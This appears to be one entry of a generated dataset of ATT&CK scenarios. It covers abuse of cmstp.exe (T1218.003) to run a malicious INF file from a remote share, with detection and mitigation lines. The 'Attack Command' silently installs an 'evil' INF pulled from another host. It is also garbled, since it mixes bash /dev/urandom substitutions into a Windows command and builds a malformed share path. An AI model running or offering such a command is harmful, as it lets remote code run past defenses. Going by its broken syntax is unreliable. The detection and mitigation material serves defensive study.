---
type: campaign
scenario_id: 225
tactic: Defense Evasion
technique: "T1218.003: CMSTP"
technique_id: T1218.003
tags: [campaign, lotl, defense_evasion]
---

# Using cmstp.exe to execute malicious INF via remote share.

## Threat Description
Using cmstp.exe to execute malicious INF via remote share.

## Attack Command
```
cmstp /ni /s \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor cmstp SMB: `wmic process where name='cmstp.exe' get commandline | findstr \\`; YARA rule: `rule CmstpSmbInf { strings: $a = /cmstp.*\\/ nocase; condition: $a }`.

## Mitigation
Restrict cmstp: `icacls %windir%\System32\cmstp.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.

## AI Training Prompt
Train AI to detect cmstp SMB INF execution and suggest SMB restrictions.

## References
- MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
